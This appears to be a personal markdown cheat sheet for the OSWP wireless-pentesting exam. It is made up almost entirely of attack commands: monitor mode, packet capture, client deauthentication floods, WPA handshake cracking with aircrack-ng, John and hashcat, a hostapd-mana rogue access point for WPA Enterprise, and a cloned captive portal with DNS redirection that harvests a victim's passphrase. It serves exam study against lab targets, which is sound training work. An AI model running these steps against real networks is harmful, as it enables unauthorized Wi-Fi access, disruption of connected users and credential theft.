# OSWP

## Aircrack-ng 
```
sudo airmon-ng check
sudo airmon-ng check kill

sudo /usr/sbin/airmon-ng
sudo airmon-ng start wlan0
sudo airmon-ng start wlan0 [channel #]
sudo airmon-ng stop wlan0

iw wlan0 info
iwconfig
ifconfig

```

## Airodump-ng 
### WEP, WPA/WPA2
#### Don't forget to specify interface
```
sudo airodump-ng [interface] --channel [#] --bssid [BSSID] --essid [ESSID] -w [file.cap]
sudo airodump-ng wlan0mon -c 2
sudo airodump-ng wlan0mon -c 3 --bssid 34:08:04:09:3D:38 -w 1.cap
```
|CMD|DESC|
|-----|-----|
|-w|output filename| 
|--bsssid|specific BSSID|
|--essid|specific client ESSID|
|--c|channel|
|-g|GPS|
|--ivs| Interval Vectors
|-R|Regular Expression|

## Aireplay-ng
#### Set card to channel [#]
```
sudo airmon-ng start wlan0 # 
```
### Deauth
```
sudo aireplay-ng [attack type] [# of deauths] -a [BSSID] -c [clientBSSID] [interface]
sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 -c 35:08:04:09:3D:40 wlan0mon
```
|CMD|DESC|
|-----|-----|
-0 |# deauths
0 | continuous
-a|BSSID
-c|client MAC

## Aircrack-ng
```
aircrack-ng -w [path to wordlist] -e [ESSID] -b [BSSID] [file.cap]
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
```
### John the Ripper
```
sudo nano /etc/john/john.conf
john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap

john --format=netntlm timothy --wordlist=/usr/share/wordlists/rockyou.txt
```
### Hashcat
```
/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
hashcat -m [hashtype] [hash] [dictionary]
hashcat -m 2500 output.hccapx /usr/share/john/password.lst

```
## Useful Linux Commands
```
scp kali@192.168.10.94:/home/kali/1.cap-01.cap .
gzip -d file .gz
```
## NMAP
```
sudo nmap -sT -p- 10.10.8.8
-A = everything
-sS = SYN scan
-sT = scan TCP
-sU = scan UDP
-p- = all ports
```
## NetCat
```
sudo nc -z -v 10.10.8.8
-z = open ports
-v = verbose
```
## Attacking WPA Enterprise
```
sudo airodump-ng wlan0mon
sudo apt install freeradius
nano ca.cnf, nano server.cnf
make
sudo apt install hostapd-mana
mana.conf
mana.eap_user
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
## Certs
```
openssl x509 -in CERT_FILENAME -noout -enddate
openssl x509 -inform der -in CERTIFICATE_FILENAME -text
make-ssl-cert generate-default-snakeoil --force-overwrite
```

## Captive Portal
```
sudo apt install apache2 libapache2-mod-php
wget -r -l2 https://www.megacorpone.com
/var/www/html/portal/index.php
sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
/var/www/html/portal/login_check.php

sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
sudo apt install dnsmasq
mco-dnsmasq.conf
sudo dnsmasq --conf-file=mco-dnsmasq.conf
sudo tail /var/log/syslog | grep dnsmasq
sudo netstat -lnp

sudo apt install nftables
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53

/etc/apache2/sites-enabled/000-default.conf > mod_rewrite/mod_alias
sudo a2enmod rewrite
sudo a2enmod alias
systemctl restart apache2

/etc/apache2/sites-enabled/000-default.conf > SSL
sudo a2enmod ssl
sudo systemctl restart apache2

nano mco-hostapd.conf
sudo hostapd -B mco-hostapd.conf
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
sudo tail -f /var/log/apache2/access.log
sudo cat /tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt
